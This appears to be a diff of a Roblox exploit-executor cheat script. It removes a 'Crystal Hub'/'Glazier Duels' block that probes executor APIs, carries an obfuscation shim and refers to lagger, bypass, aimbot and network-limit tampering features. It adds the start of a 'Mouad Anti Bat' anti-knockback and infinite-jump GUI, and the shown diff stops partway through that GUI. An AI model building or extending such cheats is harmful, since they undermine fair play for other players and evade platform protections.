@@ -1,928 +1,1033 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
 
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
--- ============================================================
--- USER SKIN - FUNCTIONAL
--- ============================================================
-local USER_SKIN = {
-    shirt = 75516091143433,
-    pants = 14953081401,
-    hair = 126541017138655,
-    headAccessory = 82762961686618,
-    backAccessory = 2413964589,
-    faceBundle = 49252142950901,
+local CONFIG_FILE = "Mouad_AntiBat_Config.json"
+local DISCORD_INVITE = "discord.gg/9sUkUNQrVD"
+
+-- Safe replacement for the original 1000-stud impulse.
+local SAFE_GUARD = {
+    -- A sudden velocity change above this is treated as knockback, not walking.
+    SpikeDelta = 110,
+    -- Only evaluate spikes on normal-length frames.
+    MaxFrameDelta = 0.2,
+    -- After a detected hit, keep vertical motion bounded instead of launching.
+    MaxVerticalAfterHit = 80,
+    -- Re-enableMotor6D joints only when a ragdoll state is detected.
+    RecoverRagdoll = true,
 }
 
-local function applyUserSkin(character)
-    if not character then return end
-
-    local Players = game:GetService("Players")
-    local InsertService = game:GetService("InsertService")
-    local player = Players.LocalPlayer
-
-    local function getHumanoid()
-        return character:FindFirstChildOfClass("Humanoid")
-    end
-
-    local humanoid = getHumanoid()
-    if not humanoid then return end
-
-    -- Clothing
-    local shirt = character:FindFirstChildOfClass("Shirt")
-    if not shirt then
-        shirt = Instance.new("Shirt")
-        shirt.Parent = character
-    end
-    shirt.ShirtTemplate = "rbxassetid://" .. tostring(USER_SKIN.shirt)
-
-    local pants = character:FindFirstChildOfClass("Pants")
-    if not pants then
-        pants = Instance.new("Pants")
-        pants.Parent = character
-    end
-    pants.PantsTemplate = "rbxassetid://" .. tostring(USER_SKIN.pants)
-
-    -- Accessories from catalog IDs.
-    local function addAccessory(assetId)
-        local ok, model = pcall(function()
-            return InsertService:LoadAsset(assetId)
-        end)
-        if not ok or not model then return end
-
-        for _, obj in ipairs(model:GetDescendants()) do
-            if obj:IsA("Accessory") then
-                local accessory = obj:Clone()
-                pcall(function()
-                    humanoid:AddAccessory(accessory)
-                end)
-                break
-            end
-        end
-        model:Destroy()
-    end
-
-    -- Avoid repeatedly stacking the same named accessories.
-    local function removeMatchingAccessories()
-        for _, obj in ipairs(character:GetChildren()) do
-            if obj:IsA("Accessory") then
-                local n = string.lower(obj.Name)
-                if string.find(n, "zoldyck")
-                    or string.find(n, "sakura")
-                    or string.find(n, "lantern")
-                    or string.find(n, "ghost") then
-                    obj:Destroy()
-                end
-            end
-        end
-    end
-
-    removeMatchingAccessories()
-    addAccessory(USER_SKIN.hair)
-    addAccessory(USER_SKIN.headAccessory)
-    addAccessory(USER_SKIN.backAccessory)
+local function clamp(x, lo, hi)
+    if x < lo then return lo end
+    if x > hi then return hi end
+    return x
 end
 
-local function applyUserSkinWhenReady()
-    local Players = game:GetService("Players")
-    local player = Players.LocalPlayer
-    if not player then return end
+local state = {
+    AntiBat = false,
+    InfJump = false,
+    LogicVersion = 1,
+    UIScale = 1.0,
+    Keybind = Enum.KeyCode.N,
+    MobileMode = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled,
+    Locked = false,
+    Collapsed = false,
+}
 
-    local character = player.Character or player.CharacterAdded:Wait()
-    task.wait(0.5)
-    applyUserSkin(character)
+local function defaultConfig()
+    return {
+        AntiBat = state.AntiBat,
+        InfJump = state.InfJump,
+        LogicVersion = state.LogicVersion,
+        UIScale = state.UIScale,
+        Keybind = state.Keybind.Name,
+        MobileMode = state.MobileMode,
+    }
+end
 
-    player.CharacterAdded:Connect(function(char)
-        task.wait(0.8)
-        applyUserSkin(char)
+local function loadConfig()
+    if not isfile or not readfile then return end
+    local ok, exists = pcall(isfile, CONFIG_FILE)
+    if not ok or not exists then return end
+
+    local readOk, raw = pcall(readfile, CONFIG_FILE)
+    if not readOk or type(raw) ~= "string" then return end
+
+    local decodeOk, data = pcall(function()
+        return HttpService:JSONDecode(raw)
+    end)
+    if not decodeOk or type(data) ~= "table" then return end
+
+    if type(data.AntiBat) == "boolean" then state.AntiBat = data.AntiBat end
+    if type(data.InfJump) == "boolean" then state.InfJump = data.InfJump end
+    if data.LogicVersion == 1 or data.LogicVersion == 2 then
+        state.LogicVersion = data.LogicVersion
+    end
+    if type(data.UIScale) == "number" then
+        state.UIScale = clamp(data.UIScale, 0.75, 1.6)
+    end
+    if type(data.MobileMode) == "boolean" then
+        state.MobileMode = data.MobileMode
+    end
+    if type(data.Keybind) == "string" then
+        local keyOk, key = pcall(function()
+            return Enum.KeyCode[data.Keybind]
+        end)
+        if keyOk and key then state.Keybind = key end
+    end
+end
+
+local function saveConfig()
+    if not writefile then return end
+    pcall(function()
+        writefile(CONFIG_FILE, HttpService:JSONEncode(defaultConfig()))
     end)
 end
 
-task.spawn(applyUserSkinWhenReady)
+loadConfig()
 
-
-repeat task.wait() until game:IsLoaded()
-
--- ===================== GLAZIER DUELS - STARTUP SPLASH =====================
-do
-	local Players = game:GetService("Players")
-	local LP2 = Players.LocalPlayer
-	local TweenService2 = game:GetService("TweenService")
-	local SoundService2 = game:GetService("SoundService")
-
-	local splashGui = Instance.new("ScreenGui")
-	splashGui.Name = "GlazierDuelsSplash"
-	splashGui.ResetOnSpawn = false
-	splashGui.DisplayOrder = 999
-	splashGui.IgnoreGuiInset = true
-	if not pcall(function() splashGui.Parent = game:GetService("CoreGui") end) then
-		splashGui.Parent = LP2:WaitForChild("PlayerGui")
-	end
-local overlay = Instance.new("Frame", splashGui)
-	overlay.Size = UDim2.new(1,0,1,0)
-	overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
-	overlay.BackgroundTransparency = 0
-	overlay.BorderSizePixel = 0
-	overlay.ZIndex = 1
-
-	local tapHint = Instance.new("TextLabel", splashGui)
-	tapHint.Size = UDim2.new(1, 0, 0, 20)
-	tapHint.Position = UDim2.new(0, 0, 1, -36) 
-	tapHint.BackgroundTransparency = 1
-	tapHint.Text = "CLICK TO SKIP"
-	tapHint.TextColor3 = Color3.fromRGB(80, 110, 160)
-	tapHint.Font = Enum.Font.Gotham
-	tapHint.TextSize = 11
-	tapHint.ZIndex = 10
-	tapHint.TextXAlignment = Enum.TextXAlignment.Center
-
-	local skipZone = Instance.new("TextButton", splashGui)
-	skipZone.Size = UDim2.new(1,0,1,0)
-	skipZone.BackgroundTransparency = 1
-	skipZone.Text = ""
-	skipZone.ZIndex = 9
-
-	local container = Instance.new("Frame", splashGui)
-	container.Size = UDim2.new(0,320,0,120)
-	container.Position = UDim2.new(0.5,-160,0,-140)
-	container.BackgroundTransparency = 1
-	container.BorderSizePixel = 0
-	container.ZIndex = 2
-	container.ClipsDescendants = false
-
-	local titleSplash = Instance.new("TextLabel", container)
-	titleSplash.Size = UDim2.new(1,0,0,70)
-	titleSplash.Position = UDim2.new(0,0,0,0)
-	titleSplash.BackgroundTransparency = 1
-	titleSplash.Text = "GLAZIER DUELS"
-	titleSplash.TextColor3 = Color3.fromRGB(255,255,255)
-	titleSplash.Font = Enum.Font.GothamBlack
-	titleSplash.TextSize = 48
-	titleSplash.TextScaled = true
-	titleSplash.TextTransparency = 0
-	titleSplash.ZIndex = 3
-	do
-		local g = Instance.new("UIGradient", titleSplash)
-		g.Color = ColorSequence.new({
-			ColorSequenceKeypoint.new(0, Color3.fromRGB(80,160,255)),
-			ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200,225,255)),
-			ColorSequenceKeypoint.new(1, Color3.fromRGB(100,80,255))
-		})
-	end
-
-	local subSplash = Instance.new("TextLabel", container)
-	subSplash.Size = UDim2.new(1,0,0,24)
-	subSplash.Position = UDim2.new(0,0,0,72)
-	subSplash.BackgroundTransparency = 1
-	subSplash.Text = "GLAZIER DUELS"
-	subSplash.TextColor3 = Color3.fromRGB(100,140,200)
-	subSplash.Font = Enum.Font.Gotham
-	subSplash.TextSize = 13
-	subSplash.TextTransparency = 0
-	subSplash.ZIndex = 3
-
-	local fragments = {}
-	local fragTexts = {"GL","AZ","IER","DU","EL","S"}
-	local fragColors = {
-		Color3.fromRGB(80,160,255),
-		Color3.fromRGB(140,100,255),
-		Color3.fromRGB(200,225,255),
-		Color3.fromRGB(100,80,255),
-		Color3.fromRGB(80,180,255),
-		Color3.fromRGB(160,120,255),
-	}
-	for i, txt in ipairs(fragTexts) do
-		local frag = Instance.new("TextLabel", splashGui)
-		frag.Size = UDim2.new(0,90,0,60)
-		frag.AnchorPoint = Vector2.new(0.5,0.5)
-		frag.Position = UDim2.new(0.5, (i-3.5)*52, 0.5, -30)
-		frag.BackgroundTransparency = 1
-		frag.Text = txt
-		frag.TextColor3 = fragColors[i]
-		frag.Font = Enum.Font.GothamBlack
-		frag.TextSize = 44
-		frag.TextTransparency = 1
-		frag.ZIndex = 5
-		frag.Rotation = 0
-		table.insert(fragments, frag)
-	end
-
-	local ContentProvider2 = game:GetService("ContentProvider")
-	local preloadedIntroSounds = {}
-	local function prepareIntroSound(id, pitch, vol)
-		local s = Instance.new("Sound")
-		s.SoundId = id
-		s.PlaybackSpeed = pitch
-		s.Volume = vol
-		s.Parent = SoundService2
-		s.RollOffMaxDistance = 0
-		table.insert(preloadedIntroSounds, s)
-		return s
-	end
-
-	local function playSound(id, pitch, vol, parent, delay)
-		task.delay(delay or 0, function()
-			local s = Instance.new("Sound")
-			s.SoundId = id
-			s.PlaybackSpeed = pitch
-			s.Volume = vol
-			s.Parent = parent
-			s.RollOffMaxDistance = 0
-			s:Play()
-			game:GetService("Debris"):AddItem(s, 3)
-		end)
-	end
-
-	-- Preload the intro audio while the screen is still black. This prevents
-	-- Roblox's first-time audio buffering from making the sound start late.
-	local introWhistleSounds = {
-		prepareIntroSound("rbxassetid://4612414100", 2.2, 0.7),
-		prepareIntroSound("rbxassetid://4612414100", 1.7, 0.8),
-		prepareIntroSound("rbxassetid://4612414100", 1.2, 0.9),
-		prepareIntroSound("rbxassetid://4612414100", 0.85, 0.9),
-		prepareIntroSound("rbxassetid://4612414100", 0.55, 0.7),
-		prepareIntroSound("rbxassetid://4612414100", 0.3, 1.0),
-	}
-	pcall(function() ContentProvider2:PreloadAsync(preloadedIntroSounds) end)
-
-	local function playPreloadedWhistle()
-		for i, s in ipairs(introWhistleSounds) do
-			task.delay(({0, 0.07, 0.15, 0.24, 0.34, 0.5})[i], function()
-				if splashDone or not s.Parent then return end
-				s:Play()
-			end)
-		end
-	end
-
-	local function playGlitchImpact()
-		playSound("rbxassetid://1588058260", 1.0, 0.9, SoundService2, 0)
-		playSound("rbxassetid://8627516764", 0.8, 0.7, SoundService2, 0.02)
-		playSound("rbxassetid://1588058260", 1.4, 0.5, SoundService2, 0.05)
-		playSound("rbxassetid://8627516764", 1.2, 0.4, SoundService2, 0.1)
-	end
-
-	local function playWhistle()
-		playPreloadedWhistle()
-	end
-
-	local function doShatterEffect()
-		pcall(playGlitchImpact)
-		local flash = Instance.new("Frame", splashGui)
-		flash.Size = UDim2.new(1,0,1,0)
-		flash.BackgroundColor3 = Color3.fromRGB(255,255,255)
-		flash.BackgroundTransparency = 0.3
-		flash.BorderSizePixel = 0
-		flash.ZIndex = 8
-		TweenService2:Create(flash, TweenInfo.new(0.18), {BackgroundTransparency=1}):Play()
-		game:GetService("Debris"):AddItem(flash, 0.3)
-		titleSplash.TextTransparency = 1
-		local RunService2 = game:GetService("RunService")
-		for i, frag in ipairs(fragments) do
-			frag.TextTransparency = 0
-			local dirX = (i - 3.5) * 60 + math.random(-80, 80)
-			local dirY = math.random(120, 280)
-			local rot = math.random(-180, 180)
-			local startPosX = frag.Position.X.Offset
-			local startPosY = frag.Position.Y.Offset
-			local t = 0
-			local conn
-			conn = RunService2.RenderStepped:Connect(function(dt)
-				t = t + dt
-				if t > 0.8 then frag.TextTransparency = 1; conn:Disconnect(); return end
-				local alpha = t / 0.8
-				local px = startPosX + dirX * alpha
-				local py = startPosY - dirY * alpha + 300 * alpha * alpha
-				local fade = math.clamp(alpha * 1.4 - 0.3, 0, 1)
-				frag.Position = UDim2.new(0.5, px, 0.5, py - 30)
-				frag.Rotation = rot * alpha
-				frag.TextTransparency = fade
-				frag.TextSize = math.clamp(44 - alpha * 20, 10, 44)
-			end)
-		end
-		for li = 1, 8 do
-			task.delay(li * 0.025, function()
-				local line = Instance.new("Frame", splashGui)
-				line.Size = UDim2.new(1, 0, 0, math.random(2,6))
-				line.Position = UDim2.new(0, 0, math.random(), 0)
-				line.BackgroundColor3 = Color3.fromRGB(math.random(60,255), math.random(0,100), math.random(150,255))
-				line.BackgroundTransparency = math.random() * 0.3
-				line.BorderSizePixel = 0
-				line.ZIndex = 7
-				TweenService2:Create(line, TweenInfo.new(0.12), {BackgroundTransparency=1}):Play()
-				game:GetService("Debris"):AddItem(line, 0.2)
-			end)
-		end
-	end
-
-	local splashDone = false
-	local function finishSplash()
-		if splashDone then return end
-		splashDone = true
-		TweenService2:Create(subSplash, TweenInfo.new(0.3), {TextTransparency=1}):Play()
-		TweenService2:Create(overlay, TweenInfo.new(0.4), {BackgroundTransparency=1}):Play()
-		tapHint.Visible = false
-	end
-
-	skipZone.Activated:Connect(function()
-		titleSplash.TextTransparency = 1
-		subSplash.TextTransparency = 1
-		finishSplash()
-	end)
-
-	task.spawn(function()
-		TweenService2:Create(overlay, TweenInfo.new(0.2), {BackgroundTransparency=0.1}):Play()
-		-- Start the already-preloaded sound BEFORE the title animation.
-		-- This keeps the audio synchronized with the very first visible intro frame.
-		if not splashDone then pcall(playWhistle) end
-		TweenService2:Create(container, TweenInfo.new(0.45, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
-			{Position=UDim2.new(0.5,-160,0.5,-60)}):Play()
-		task.wait(0.5)
-		if not splashDone then doShatterEffect() end
-		task.wait(0.85)
-		finishSplash()
-		task.wait(0.45)
-		if splashGui and splashGui.Parent then splashGui:Destroy() end
-	end)
-
-	local _t0 = tick()
-	while not splashDone and (tick() - _t0) < 3.0 do
-		task.wait(0.05)
-	end
+-- Destroy a previous copy of this GUI.
+local oldGui = playerGui:FindFirstChild("MouadAntiBat")
+if oldGui then
+    oldGui:Destroy()
 end
--- Compilacion de compatibilidad sin pragma
-	-- GLAZIER DUELS																																											
-	-- Luarmor/Luraph 14.8/14.9 compatibility shim. Luarmor replaces the macro
-	-- while obfuscating; the identity fallback keeps the source runnable as-is.
-	if not LPH_OBFUSCATED then
-	LPH_NO_VIRTUALIZE = function(callback)
-	return callback
-	end
-	end
 
-	-- Luarmor sigue renombrando y ofuscando este bloque, pero no lo ejecuta
-	-- dentro de su VM. El script registra muchos callbacks por frame y la VM
-	-- multiplicaba su coste, especialmente al activar Anti Lag.
-	;LPH_NO_VIRTUALIZE(function()
+local C = {
+    bg      = Color3.fromRGB(12, 4, 6),
+    panel   = Color3.fromRGB(32, 10, 14),
+    card    = Color3.fromRGB(48, 14, 18),
+    accent  = Color3.fromRGB(220, 40, 50),
+    accent2 = Color3.fromRGB(255, 90, 100),
+    glow    = Color3.fromRGB(180, 25, 35),
+    dark    = Color3.fromRGB(70, 18, 24),
+    text    = Color3.fromRGB(255, 240, 242),
+    muted   = Color3.fromRGB(200, 140, 150),
+    on      = Color3.fromRGB(120, 255, 100),
+    off     = Color3.fromRGB(180, 160, 140),
+    white   = Color3.fromRGB(255, 255, 255),
+    stroke  = Color3.fromRGB(220, 40, 50),
+    v1      = Color3.fromRGB(255, 80, 90),
+    v2      = Color3.fromRGB(180, 25, 35),
+}
 
-	-- Compatibilidad entre executors: algunos publican la misma API con aliases.	
-	-- Se normaliza el entorno, sin cambiar el comportamiento de las funciones.
-	do
-	local scriptEnv = _G
-	pcall(function()
-	if type(getfenv) == "function" then scriptEnv = getfenv(0) end
-	end)
-	local sharedEnv = scriptEnv
-	pcall(function()
-	if type(getgenv) == "function" then sharedEnv = getgenv() end
-	end)
-	if type(scriptEnv) ~= "table" then scriptEnv = _G end
-	if type(sharedEnv) ~= "table" then sharedEnv = scriptEnv end
+local function font(name)
+    local ok, value = pcall(function()
+        return Enum.Font[name]
+    end)
+    if ok and value then return value end
+    return Enum.Font.GothamBold
+end
 
-	local hiddenSetter = rawget(scriptEnv, "sethiddenproperty")
-	or rawget(sharedEnv, "sethiddenproperty")
-	or rawget(scriptEnv, "set_hidden_property")
-	or rawget(sharedEnv, "set_hidden_property")
-	or rawget(scriptEnv, "sethiddenprop")
-	or rawget(sharedEnv, "sethiddenprop")
-	local synApi = rawget(scriptEnv, "syn") or rawget(sharedEnv, "syn")
-	if type(hiddenSetter) ~= "function" and type(synApi) == "table" then
-	hiddenSetter = rawget(synApi, "sethiddenproperty") or rawget(synApi, "set_hidden_property")
-	end
-	if type(hiddenSetter) == "function" then
-	pcall(function() rawset(scriptEnv, "sethiddenproperty", hiddenSetter) end)
-	pcall(function() rawset(sharedEnv, "sethiddenproperty", hiddenSetter) end)
-	end
-	-- Quitar el límite del executor desde el principio. Algunos executors
-	-- interpretan 0 como "volver a 60 FPS", así que usamos un techo práctico
-	-- muy alto. Si no existe la API, no interrumpe el resto del script.
-	local fpsCapSetter = rawget(scriptEnv, "setfpscap")
-	or rawget(sharedEnv, "setfpscap")
-	or rawget(scriptEnv, "set_fps_cap")
-	or rawget(sharedEnv, "set_fps_cap")
-	or rawget(scriptEnv, "setfpslimit")
-	or rawget(sharedEnv, "setfpslimit")
-	if type(fpsCapSetter) ~= "function" and type(synApi) == "table" then
-	fpsCapSetter = rawget(synApi, "setfpscap") or rawget(synApi, "set_fps_cap")
-	end
-	if type(fpsCapSetter) == "function" then pcall(fpsCapSetter, 9999) end
-	end
+local function new(className, props, parent)
+    local obj = Instance.new(className)
+    for k, v in pairs(props or {}) do
+        obj[k] = v
+    end
+    if parent then obj.Parent = parent end
+    return obj
+end
 
-	local Players, UserInputService, TweenService, RunService, ReplicatedStorage,
-	Lighting, HttpService, Player, isMobile = (function()
-	local players = game:GetService("Players")
-	local input = game:GetService("UserInputService")
-	-- GetPlatform puede no estar disponible; conservar la deteccion tactil.
-	local mobile = input.TouchEnabled
-	pcall(function()
-	local platform = input:GetPlatform()
-	mobile = input.TouchEnabled and (
-	platform == Enum.Platform.Android
-	or platform == Enum.Platform.IOS
-	or not input.MouseEnabled
-	)
-	end)
+local function corner(parent, radius)
+    return new("UICorner", { CornerRadius = UDim.new(0, radius) }, parent)
+end
 
-	return players,
-	input,
-	game:GetService("TweenService"),
-	game:GetService("RunService"),
-	game:GetService("ReplicatedStorage"),
-	game:GetService("Lighting"),
-	game:GetService("HttpService"),
-	players.LocalPlayer,
-	mobile
-	end)()
+local function stroke(parent, color, thickness, transparency)
+    return new("UIStroke", {
+        Color = color,
+        Thickness = thickness,
+        Transparency = transparency or 0,
+    }, parent)
+end
 
-	-- Wave puede cerrar el cliente al combinar hooks globales de metamethods con
-	-- codigo protegido por Luarmor. Detectarlo una vez permite conservar las
-	-- funciones normales y usar el motor de velocidad directo sin esos hooks.
-	local executorName = "unknown"
-	do
-	local executorEnv = _G
-	pcall(function()
-	if type(getgenv) == "function" then executorEnv = getgenv() end
-	end)
-	if type(executorEnv) ~= "table" then executorEnv = _G end
-	local identify = rawget(executorEnv, "identifyexecutor")
-	or rawget(executorEnv, "getexecutorname")
-	or (type(_G) == "table" and (rawget(_G, "identifyexecutor") or rawget(_G, "getexecutorname")))
-	if type(identify) == "function" then
-	pcall(function()
-	local name = identify()
-	if name ~= nil then executorName = tostring(name) end
-	end)
-	end
-	end
-	local waveSafeMode = string.find(string.lower(executorName), "wave", 1, true) ~= nil
-	_G.__CrystalWaveSafeMode = waveSafeMode
+local gui = new("ScreenGui", {
+    Name = "MouadAntiBat",
+    IgnoreGuiInset = true,
+    ResetOnSpawn = false,
+    DisplayOrder = 12,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+}, playerGui)
 
-	-- ==================== RESET TOTAL DE LA INSTANCIA ANTERIOR ====================
-	-- Al re-ejecutar Crystal, la instancia previa se elimina POR COMPLETO:
-	-- UI, keybinds, loops, toggles y rastros en los personajes.
-	do
-	local guiRootNames = {
-	"GlazierDuels_Panel", "GlazierDuels", "CRYSTAL_Panel", "DashEffectGui", "CrystalAutoGrabBar",
-	"CrystalLaggerGUI", "CrystalBypassGUI", "CrystalMobileUI",
-	"CrystalEnemyWidget",
-	}
+local uiScale = new("UIScale", { Scale = state.UIScale }, gui)
 
-	-- 1) Parar y desconectar todo lo que la instancia previa registró
-	-- El Bypass antiguo mantenia un task.spawn propio fuera del registro global.
-	-- Detenerlo antes de destruir su GUI evita acumular un emisor por reejecucion.
-	pcall(function()
-	local oldBypass = _G.CrystalBypass
-	if oldBypass then
-	if oldBypass.Stop then
-	oldBypass.Stop()
-	else
-	-- Las versiones antiguas no exponian Stop. Desactivar tambien el modo
-	-- automatico evita que su listener huerfano vuelva a arrancar el hilo.
-	if oldBypass.SetAutoOnSteal then oldBypass.SetAutoOnSteal(false) end
-	if oldBypass.SetBypass then oldBypass.SetBypass(false) end
-	end
-	end
-	end)
-	-- Lagger tambien mantiene hilos propios fuera de las conexiones globales.
-	-- Detenerlos antes de construir la nueva instancia evita acumular payloads
-	-- al reejecutar, una causa frecuente de cierre por memoria en telefono.
-	pcall(function()
-	local oldLagger = _G.CrystalLagger
-	if oldLagger then
-	if oldLagger.Stop then
-	oldLagger.Stop()
-	else
-	if oldLagger.SetEnabled then oldLagger.SetEnabled(false) end
-	if oldLagger.SetLowEndEnabled then oldLagger.SetLowEndEnabled(false) end
-	end
-	end
-	end)
-	if _G.__CRYSTAL_STATE then
-	_G.__CRYSTAL_STATE.alive = false
-	pcall(function()
-	for _, stopper in ipairs(_G.__CRYSTAL_STATE.stoppers or {}) do pcall(stopper) end
-	for _, conn in ipairs(_G.__CRYSTAL_STATE.conns or {}) do pcall(function() conn:Disconnect() end) end
-	end)
-	end
-	_G.__CRYSTAL_STATE = nil
-	_G.__CrystalTrackConn = nil
-	_G.__CrystalTrackStopper = nil
+local main = new("Frame", {
+    Name = "Main",
+    Active = true,
+    ClipsDescendants = true,
+    Position = UDim2.new(0.5, -155, 0.5, -170),
+    Size = UDim2.new(0, 310, 0, 340),
+    BackgroundColor3 = C.bg,
+    BorderSizePixel = 0,
+}, gui)
+corner(main, 14)
+stroke(main, C.glow, 1.6, 0.2)
 
-	-- 2) Conexiones conocidas guardadas en _G
-	pcall(function()
-	if _G.__speedBoostConn then _G.__speedBoostConn:Disconnect(); _G.__speedBoostConn = nil end
-	end)
-	pcall(function() if _G.__stopSpeedBoost then _G.__stopSpeedBoost() end end)
-	-- Las versiones anteriores restauraban el limite de salida a 0 al cerrar
-	-- Bypass/Lagger. Eso puede cortar la replicacion del personaje y dejarlo
-	-- desincronizado incluso con todos los toggles apagados.
-	pcall(function()
-	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-	end)
+local topLine = new("Frame", {
+    Name = "AccentLine",
+    Size = UDim2.new(1, 0, 0, 3),
+    BackgroundColor3 = C.accent,
+    BorderSizePixel = 0,
+    ZIndex = 6,
+}, main)
 
-	-- 3) Destruir TODAS las GUIs raíz de la versión anterior
-	pcall(function()
-	local coreGui = game:GetService("CoreGui")
-	for _, container in ipairs({ coreGui, Player.PlayerGui }) do
-	for _, name in ipairs(guiRootNames) do
-	while true do
-	local found = container:FindFirstChild(name)
-	if not found then break end
-	found:Destroy()
-	end
-	end
-	end
-	end)
+local header = new("Frame", {
+    Name = "Header",
+    Active = true,
+    ZIndex = 5,
+    Size = UDim2.new(1, 0, 0, 54),
+    BackgroundTransparency = 1,
+}, main)
 
-	-- 4) Limpiar rastros en personajes (billboards de velocidad, overheads...)
-	pcall(function()
-	for _, plr in ipairs(Players:GetPlayers()) do
-	local ch = plr.Character
-	if ch then
-	for _, part in ipairs(ch:GetChildren()) do
-	for _, child in ipairs(part:GetChildren()) do
-	if child.Name == "GreenDuelsBB" or child.Name == "CrystalSpeedBill" or child.Name == "CrystalHubOverhead"
-	or child.Name == "CrystalAimbotBodyLock" or child.Name == "CrystalAimbotBodyAttachment"
-	or child.Name == "CrystalTPBatMarkerBodyLock" or child.Name == "CrystalTPBatMarkerAttachment" then
-	child:Destroy()
-	end
-	end
-	end
-	end
-	end
-	end)
+local title = new("TextLabel", {
+    Name = "Title",
+    ZIndex = 6,
+    Position = UDim2.new(0, 12, 0, 6),
+    Size = UDim2.new(0.62, 0, 0, 26),
+    BackgroundTransparency = 1,
+    Text = "MOUAD ANTI BAT",
+    TextColor3 = C.white,
+    TextSize = 15,
+    Font = font("GothamBlack"),
+    TextXAlignment = Enum.TextXAlignment.Left,
+}, header)
+stroke(title, C.accent, 1.8, 0.1)
 
-	-- 5) Registro para la NUEVA instancia: la próxima ejecución borrará esto
-	_G.__CRYSTAL_STATE = { conns = {}, stoppers = {}, alive = true }
-	_G.__CrystalTrackConn = function(conn)
-	if conn then table.insert(_G.__CRYSTAL_STATE.conns, conn) end
-	return conn
-	end
-	_G.__CrystalTrackStopper = function(fn)
-	if fn then table.insert(_G.__CRYSTAL_STATE.stoppers, fn) end
-	end
-	_G.__CrystalResetHooks = {}
-	_G.__CrystalOnNewInstance = function(fn)
-	if fn then table.insert(_G.__CrystalResetHooks, fn) end
-	end
-	end
-	local crystalRuntimeState = _G.__CRYSTAL_STATE
-	-- Un único planificador comparte los recorridos pesados del mapa y de la UI.
-	-- Cada frame consume como máximo ~0.8 ms, evitando que varios optimizadores
-	-- hagan picos de trabajo simultáneos.
-	do
-	local traversalJobs = {}
-	local traversalConnection = nil
-	local function ensureTraversalRunner()
-	if traversalConnection then return end
-	traversalConnection = RunService.Heartbeat:Connect(function()
-	local deadline = os.clock() + 0.0008
-	while traversalJobs[1] and os.clock() < deadline do
-	local job = traversalJobs[1]
-	if job.cancelled or (job.continue and not job.continue()) then
-	table.remove(traversalJobs, 1)
-	else
-	local object = job.pending[#job.pending]
-	if not object then
-	table.remove(traversalJobs, 1)
-	else
-	job.pending[#job.pending] = nil
-	pcall(job.apply, object)
-	local ok, children = pcall(function() return object:GetChildren() end)
-	if ok then
-	for _, child in ipairs(children) do job.pending[#job.pending + 1] = child end
-	end
-	-- Rotar trabajos para que Anti Lag, Optimizer y temas progresen juntos.
-	if traversalJobs[2] then
-	table.remove(traversalJobs, 1)
-	traversalJobs[#traversalJobs + 1] = job
-	end
-	end
-	end
-	end
-	if not traversalJobs[1] then
-	traversalConnection:Disconnect()
-	traversalConnection = nil
-	end
-	end)
-	_G.__CrystalTrackConn(traversalConnection)
-	end
-	_G.__CrystalWalkDescendantsBatched = function(roots, apply, shouldContinue)
-	local job = { pending = {}, apply = apply, continue = shouldContinue, cancelled = false }
-	if typeof(roots) == "Instance" then roots = { roots } end
-	for _, root in ipairs(roots or {}) do
-	if root then
-	local ok, children = pcall(function() return root:GetChildren() end)
-	if ok then for _, child in ipairs(children) do job.pending[#job.pending + 1] = child end end
-	end
-	end
-	traversalJobs[#traversalJobs + 1] = job
-	ensureTraversalRunner()
-	return function() job.cancelled = true end
-	end
-	_G.__CrystalTrackStopper(function()
-	for _, job in ipairs(traversalJobs) do job.cancelled = true end
-	traversalJobs = {}
-	if traversalConnection then traversalConnection:Disconnect(); traversalConnection = nil end
-	end)
-	end
-	local CONFIG_FILE = "CrystalHub_UI_Config.txt"
+local subtitle = new("TextLabel", {
+    Name = "Subtitle",
+    ZIndex = 6,
+    Position = UDim2.new(0, 12, 0, 32),
+    Size = UDim2.new(0.7, 0, 0, 14),
+    BackgroundTransparency = 1,
+    Text = "Anti Bat  ·  " .. DISCORD_INVITE,
+    TextColor3 = C.accent2,
+    TextSize = 10,
+    Font = font("GothamBold"),
+    TextXAlignment = Enum.TextXAlignment.Left,
+}, header)
 
-	do
-	-- Anti Die de Sacar cosas.txt. El interruptor de la GUI tiene prioridad
-	-- sobre cualquier peticion de apagado de Auto Bat u otra funcion.
-	local antiDieEnabled = false
-	local antiDieStopped = false
-	_G.__CrystalAntiDieGuiEnabled = nil
-	local antiDieCharConns = {}
-	local antiDieCharAddedConn = nil
+local function headerButton(name, text, rightOffset)
+    local btn = new("TextButton", {
+        Name = name,
+        AnchorPoint = Vector2.new(1, 0),
+        Position = UDim2.new(1, -rightOffset, 0, 12),
+        Size = UDim2.new(0, 28, 0, 28),
+        BackgroundColor3 = C.card,
+        Text = text,
+        TextColor3 = C.white,
+        TextSize = 12,
+        Font = font("GothamBold"),
+        AutoButtonColor = false,
+        ZIndex = 7,
+    }, header)
+    corner(btn, 8)
+    stroke(btn, C.accent, 1.1, 0.35)
+    return btn
+end
 
-	local function clearCharEntry(char, restore)
-	local entry = antiDieCharConns[char]
-	if entry then
-	if entry.healthConn then pcall(function() entry.healthConn:Disconnect() end) end
-	if entry.diedConn then pcall(function() entry.diedConn:Disconnect() end) end
-	if entry.cleanupConn then pcall(function() entry.cleanupConn:Disconnect() end) end
-	antiDieCharConns[char] = nil
-	end
-	if restore and char and char.Parent then
-	pcall(function()
-	local hum = char:FindFirstChildOfClass("Humanoid")
-	if hum then
-	hum.BreakJointsOnDeath = true
-	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
-	end
-	end)
-	end
-	end
+local lockBtn = headerButton("LockBtn", state.Locked and "🔒" or "🔓", 12)
+local modeBtn = headerButton("ModeBtn", state.MobileMode and "PC" or "MOB", 44)
+local swapBtn = headerButton("SwapBtn", "⧉", 76)
 
-	local function applyAntiDieToCharacter(char)
-	if not char or not char.Parent then return end
-	local hum = char:FindFirstChildOfClass("Humanoid")
-	if not hum then return end
+-- Collapsed mini bar, matching the original 168x52 collapsed state.
+local miniBar = new("Frame", {
+    Name = "MiniBar",
+    ZIndex = 20,
+    Visible = false,
